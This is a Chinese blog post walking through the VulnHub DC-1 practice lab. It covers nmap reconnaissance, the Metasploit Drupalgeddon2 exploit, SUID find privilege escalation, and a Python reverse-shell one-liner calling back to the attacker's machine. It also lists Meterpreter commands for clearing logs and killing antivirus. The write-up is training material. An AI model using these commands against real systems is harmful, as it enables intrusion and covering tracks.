@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="地址DC: 1 ~ VulnHub 0.题外话，虚拟机网络设置安装不必多说，使用桥接模式即可（如果是校园网之类环境可能导致桥接扫不到目标靶机，可以在物理机上新建一个本地回环的虚拟网卡 win+x打开设备管理器，-&gt;操作-&gt;添加过时的硬件-&gt;安装我手动选择的（高级）-&gt;网络适配器-&gt;厂商（Microsoft）型号（Microsoft KM-TEST环回适配器）  然后找">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶场实战  DC">
+<meta property="og:url" content="https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/index.html">
+<meta property="og:site_name" content="ta3shi 个人学习自用">
+<meta property="og:description" content="地址DC: 1 ~ VulnHub 0.题外话，虚拟机网络设置安装不必多说，使用桥接模式即可（如果是校园网之类环境可能导致桥接扫不到目标靶机，可以在物理机上新建一个本地回环的虚拟网卡 win+x打开设备管理器，-&gt;操作-&gt;添加过时的硬件-&gt;安装我手动选择的（高级）-&gt;网络适配器-&gt;厂商（Microsoft）型号（Microsoft KM-TEST环回适配器）  然后找">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060249258.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060264822.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060275575.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060366887.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060328621.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060381092.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060418967.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060513419.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060522665.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060561766.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060584605.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060678290.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060695057.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060706108.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060717908.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060735659.png">
+<meta property="article:published_time" content="2025-04-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-12T14:41:01.214Z">
+<meta property="article:author" content="ta3shi">
+<meta property="article:tag" content="linux提权">
+<meta property="article:tag" content="vulnhub靶场">
+<meta property="article:tag" content="靶场实战">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060249258.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>靶场实战  DC</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/04/27/suid%E6%8F%90%E6%9D%83%E5%AE%9E%E6%88%98%20Toppo/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/03/25/Yii%20%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&text=靶场实战  DC"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&title=靶场实战  DC"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&is_video=false&description=靶场实战  DC"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶场实战  DC&body=Check out this article: https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&title=靶场实战  DC"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&title=靶场实战  DC"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&title=靶场实战  DC"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&title=靶场实战  DC"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&name=靶场实战  DC&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&t=靶场实战  DC"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E9%A2%98%E5%A4%96%E8%AF%9D%EF%BC%8C%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">0.题外话，虚拟机网络设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%AD%A3%E5%BC%8F%E5%BC%80%E5%A7%8B"><span class="toc-number">2.</span> <span class="toc-text">1.正式开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">2.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%9B%AE%E6%A0%87%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">3.目标渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">5.</span> <span class="toc-text">4.权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag%E5%AF%BB%E6%89%BE"><span class="toc-number">6.</span> <span class="toc-text">flag寻找</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        靶场实战  DC
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ta3shi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-24T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-04-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/">靶场实战</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag">linux提权</a>, <a class="p-category" href="/tags/vulnhub%E9%9D%B6%E5%9C%BA/" rel="tag">vulnhub靶场</a>, <a class="p-category" href="/tags/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" rel="tag">靶场实战</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>地址<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">DC: 1 ~ VulnHub</a></p>
+<h2 id="0-题外话，虚拟机网络设置"><a href="#0-题外话，虚拟机网络设置" class="headerlink" title="0.题外话，虚拟机网络设置"></a>0.题外话，虚拟机网络设置</h2><p>安装不必多说，使用桥接模式即可（如果是校园网之类环境可能导致桥接扫不到目标靶机，可以在物理机上新建一个本地回环的虚拟网卡</p>
+<p>win+x打开设备管理器，-&gt;操作-&gt;添加过时的硬件-&gt;安装我手动选择的（高级）-&gt;网络适配器-&gt;厂商（Microsoft）型号（Microsoft KM-TEST环回适配器）</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060249258.png"></p>
+<p>然后找到高级网络设置，将我们新添加的网卡改名虚拟机（方便找）</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060264822.png"></p>
+<p>然后在连接网络的网卡上选择更多，共享，按照如图设置</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060275575.png"></p>
+<p>最后在选择虚拟机的网卡时选择我们刚刚设置的网卡，即可在物理机和虚拟机小范围使用局域网）</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060366887.png"></p>
+<h2 id="1-正式开始"><a href="#1-正式开始" class="headerlink" title="1.正式开始"></a>1.正式开始</h2><p>使用nmap简单扫描，<code>-sn</code>是Nmap的<strong>主机发现扫描模式</strong>，主要用于探测目标主机是否在线，而不会执行端口扫描。其核心特点包括：<strong>作用</strong>：通过发送ICMP Echo请求（ping）、TCP SYN到80端口、TCP ACK到80端口等组合探测包，判断目标主机是否存活。</p>
+<p>其他常用nmap指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1\. 端口扫描参数</span><br><span class="line">-sS（TCP SYN扫描）</span><br><span class="line">特点：半开放扫描，仅发送SYN包，不完成TCP三次握手，速度快且隐蔽性强。</span><br><span class="line">适用场景：需要快速扫描且避免被防火墙记录的场景，需管理员权限（如Linux的sudo） 。</span><br><span class="line">-sT（TCP全连接扫描）</span><br><span class="line">特点：完成TCP三次握手，准确性高但速度较慢，易被日志记录。</span><br><span class="line">适用场景：无管理员权限时的默认TCP扫描方式 。</span><br><span class="line">-sU（UDP扫描）</span><br><span class="line">特点：检测UDP端口状态，速度较慢且可靠性低（UDP无连接状态）。</span><br><span class="line">适用场景：探测DNS、SNMP等UDP服务 。</span><br><span class="line">2\. 服务与版本探测 -sV</span><br><span class="line">作用：识别开放端口上的服务及其版本信息。</span><br><span class="line">示例：nmap -sV 192.168.1.1会显示端口的服务名称和版本号 。</span><br><span class="line">-A（全面扫描）</span><br><span class="line">功能：启用操作系统检测（-O）、版本探测（-sV）、脚本扫描（-sC）和路由追踪（--traceroute）。</span><br><span class="line">适用场景：全面渗透测试，需详细目标信息 。</span><br><span class="line">3\. 操作系统检测  -O</span><br><span class="line">作用：基于TCP/IP协议栈指纹猜测目标操作系统。</span><br><span class="line">增强选项：--osscan-limit和--osscan-guess可提高准确性 。</span><br><span class="line">4\. 扫描速度与隐蔽性</span><br><span class="line">-T&lt;0-5&gt;（时间模板）</span><br><span class="line">推荐：-T4（快速模式）平衡速度与准确性；-T5（疯狂模式）牺牲准确性换速度，适合高性能网络 。</span><br><span class="line">-f（分片）与-D（诱饵IP）。</span><br><span class="line">5\. 输出格式</span><br><span class="line">-oN/-oX/-oG</span><br><span class="line">功能：分别输出普通文本、XML格式和Grep友好格式，便于后续分析 。</span><br><span class="line">6\. 脚本引擎</span><br><span class="line">--script</span><br><span class="line">功能：调用Nmap脚本引擎（NSE）执行漏洞检测或自动化任务。</span><br><span class="line">示例：--script=vuln检测常见漏洞，--script=whois-domain查询域名信息</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参数选择策略</span><br><span class="line">快速主机发现：-sn + -T4，例如nmap -sn -T4 192.168.1.0/24。</span><br><span class="line">详细端口扫描：-sS（SYN扫描） + -sV + -O，例如nmap -sS -sV -O 192.168.1.1。</span><br><span class="line">绕过防火墙：-sS + -f + --script=firewall-bypass。</span><br><span class="line">全面渗透测试：-A + -p-（全端口） + -T4，例如nmap -A -p- -T4 192.168.1.1。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060328621.png"></p>
+<p>192.168.1.112为新出现的ip，应该就是我们的目标靶机</p>
+<p>直接上用全面测试看一下端口开放情况<code>nmap 192.168.1.112 -A -p-</code></p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060381092.png"></p>
+<p>通常22端口的ssh一般是没有利用点的，所以一般渗透时通常查看的是80端口的网页或者其他端口开放的网页，这里可以看到80端口有一个drupal的框架，使用–script&#x3D;vuln扫描时也可以看到有较多漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap 192.168.1.112 -p22,80,111,43014 --script=vuln</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 07:38 EDT</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.74% done; ETC: 07:40 (0:00:00 remaining)                                                                                             </span><br><span class="line">Nmap scan report for 192.168.1.112                                                                                                                        </span><br><span class="line">Host is up (0.00096s latency).                                                                                                                            </span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE                                                                                                                                   </span><br><span class="line">22/tcp    open  ssh                                                                                                                                       </span><br><span class="line">80/tcp    open  http                                                                                                                                      </span><br><span class="line">| http-vuln-cve2014-3704:                                                                                                                                 </span><br><span class="line">|   VULNERABLE:                                                                                                                                           </span><br><span class="line">|   Drupal - pre Auth SQL Injection Vulnerability</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|     IDs:  CVE:CVE-2014-3704</span><br><span class="line">|         The expandArguments function in the database abstraction API in</span><br><span class="line">|         Drupal core 7.x before 7.32 does not properly construct prepared</span><br><span class="line">|         statements, which allows remote attackers to conduct SQL injection</span><br><span class="line">|         attacks via an array containing crafted keys.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2014-10-15</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.drupal.org/SA-CORE-2014-005</span><br><span class="line">|       https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html</span><br><span class="line">|       http://www.securityfocus.com/bid/70595</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.112</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.1.112:80/</span><br><span class="line">|     Form id: user-login-form</span><br><span class="line">|     Form action: /node?destination=node</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.1.112:80/node?destination=node</span><br><span class="line">|     Form id: user-login-form</span><br><span class="line">|     Form action: /node?destination=node</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.1.112:80/user/password</span><br><span class="line">|     Form id: user-pass</span><br><span class="line">|     Form action: /user/password</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.1.112:80/user/register</span><br><span class="line">|     Form id: user-register-form</span><br><span class="line">|     Form action: /user/register</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.1.112:80/user</span><br><span class="line">|     Form id: user-login</span><br><span class="line">|     Form action: /user</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.1.112:80/user/</span><br><span class="line">|     Form id: user-login</span><br><span class="line">|_    Form action: /user/</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /rss.xml: RSS or Atom feed</span><br><span class="line">|   /robots.txt: Robots file</span><br><span class="line">|   /UPGRADE.txt: Drupal file</span><br><span class="line">|   /INSTALL.txt: Drupal file</span><br><span class="line">|   /INSTALL.mysql.txt: Drupal file</span><br><span class="line">|   /INSTALL.pgsql.txt: Drupal file</span><br><span class="line">|   /: Drupal version 7 </span><br><span class="line">|   /README: Interesting, a readme.</span><br><span class="line">|   /README.txt: Interesting, a readme.</span><br><span class="line">|   /0/: Potentially interesting folder</span><br><span class="line">|_  /user/: Potentially interesting folder</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">43014/tcp open  unknown</span><br><span class="line">MAC Address: 08:00:27:FE:29:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 255.85 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-目标渗透"><a href="#3-目标渗透" class="headerlink" title="3.目标渗透"></a>3.目标渗透</h2><p>扫到这些东西平时都是要查看一下的，今天这个简单靶场我们直接用exp打进去即可</p>
+<p>使用msfconsole查看drupal相关exp直接打试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf常用命令</span><br><span class="line">search &lt;关键词&gt;：搜索漏洞模块（如search ms17_010） </span><br><span class="line">use &lt;模块路径&gt;：加载模块（如use exploit/windows/smb/ms17_010_eternalblue） </span><br><span class="line">show options：查看当前模块需配置的参数 </span><br><span class="line">set &lt;参数名&gt; &lt;值&gt;：设置参数（如set RHOST 192.168.1.1;set rports 8080;端口80时可缺省） </span><br><span class="line">exploit或run：执行攻击</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Meterpreter后渗透命令</p>
+<ul>
+<li><p>文件与系统操作</p>
+<ul>
+<li><p>upload &lt;本地文件&gt; &lt;目标路径&gt;：上传文件</p>
+</li>
+<li><p>download &lt;目标文件&gt;：下载文件</p>
+</li>
+<li><p>shell：进入目标命令行</p>
+</li>
+<li><p>screenshot：截取屏幕</p>
+</li>
+</ul>
+</li>
+<li><p>提权与信息收集</p>
+<ul>
+<li><p>getsystem：尝试提权至SYSTEM</p>
+</li>
+<li><p>hashdump：导出SAM哈希</p>
+</li>
+<li><p>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications：枚举安装的软件</p>
+</li>
+</ul>
+</li>
+<li><p>进程与网络管理</p>
+<ul>
+<li><p>ps：查看进程</p>
+</li>
+<li><p>migrate ：迁移进程（如迁移到explorer.exe）</p>
+</li>
+<li><p>portfwd add -l &lt;本地端口&gt; -p &lt;目标端口&gt; -r &lt;目标IP&gt;：端口转发</p>
+</li>
+</ul>
+</li>
+<li><p>隐蔽与清理</p>
+<ul>
+<li><p>clearev：清除事件日志</p>
+</li>
+<li><p>run killav：关闭杀毒软件</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>查找drupal相关漏洞payload ，这里使用第一条，也可以具体指定<code>use exploit/unix/webapp/drupal_drupalgeddon2</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060418967.png"></p>
+<p>设置靶机ip，由于端口是80端口可以不指定，直接使用run开始攻击</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060513419.png"></p>
+<h2 id="4-权限提升"><a href="#4-权限提升" class="headerlink" title="4.权限提升"></a>4.权限提升</h2><p>为了后续提权，我们将提权脚本上传到靶机tmp目录，使用linpeas.sh（可以直接到github搜索下载这个脚本）<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060522665.png"></p>
+<p>执行这个脚本看看提权点（这里显示的权限还不够，最好直接chmod 777 1.sh完全提权）<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060561766.png"></p>
+<p>在这里看到黄字标黄的find具备suid权限，可以使用suid提权<br>也可以使用<code>find / -perm -u=s 2&gt;/dev/null</code>来查找可以可能存在suid的命令，不过需要自己辨认一下。</p>
+<p><code>find . / -exec &quot;/bin/sh&quot; \;</code>即可提权到root<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060584605.png"></p>
+<h2 id="flag寻找"><a href="#flag寻找" class="headerlink" title="flag寻找"></a>flag寻找</h2><p>最后找一下这个靶场的flag文件</p>
+<p>在&#x2F;var&#x2F;www目录下有flag1.txt读取为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br></pre></td></tr></table></figure>
+
+<p>提示我们要查找相关配置文件</p>
+<p>drupal的默认配置文件为<code>/var/www/sites/default/settings.php</code></p>
+<p>在该文件中发现flag2并提示我们要提升权限，同时我们在里面找到了数据库的信息<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060678290.png"></p>
+<p>直接使用shell创建的shell不稳定，我们使用python反弹一个交互式的shell</p>
+<p>反弹命令可以在<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">[~]#棱角 ::Edge.Forum*</a>直接生成</p>
+<p><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.111&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>之后就可以登录mysql查看数据库<code>mysql -udbuser -pR0ck3t</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">show tables;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到有admin用户，应该是网页的admin账号，这里密码是加密显示的，要么破解，要么使用相同的加密方式加密一个已知密码替换，drupal的加密方式为scripts下的password-hash.sh<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060695057.png"></p>
+<p>因此我们在drupal目录下运行<code>php scripts/password-hash.sh 123456</code>即可生成123456的密文，替换进去即可</p>
